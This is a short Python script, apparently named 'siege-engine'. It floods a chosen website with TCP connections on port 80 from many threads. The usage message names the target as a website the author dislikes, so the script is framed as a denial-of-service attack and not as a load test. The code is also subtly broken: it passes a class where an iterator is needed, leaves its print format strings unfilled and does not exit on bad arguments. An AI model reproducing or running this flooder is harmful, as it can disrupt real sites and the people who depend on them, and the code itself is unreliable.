import socket
import time
import sys
from concurrent.futures import ThreadPoolExecutor

connections = 0

def flood_tcp(host: str):
    global connections
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, 80))
    time.sleep(3)
    sock.close()
    connections += 1


class InfiniteIterator:
    def __init__(self, hostname: str):
        self.hostname = hostname

    def __next__(self):
        return self.hostname,


def run():
    global connections
    if len(sys.argv) < 3:
        print('Correct usage is siege-engine number-of-threads-you-want-to-ping this-website-that-i-dislike.ru')
    amount, hostname = sys.argv[1:]
    print('Pinging %s on %s threads')
    amount = int(amount)
    tcpSynFlooderThread = ThreadPoolExecutor(max_workers=amount)
    now = (time.time())
    for _ in tcpSynFlooderThread.map(flood_tcp, InfiniteIterator):
        if int(time.time()) != now:
            now = int(time.time())
            print('Last seconds made %s', connections)
            connections = 0
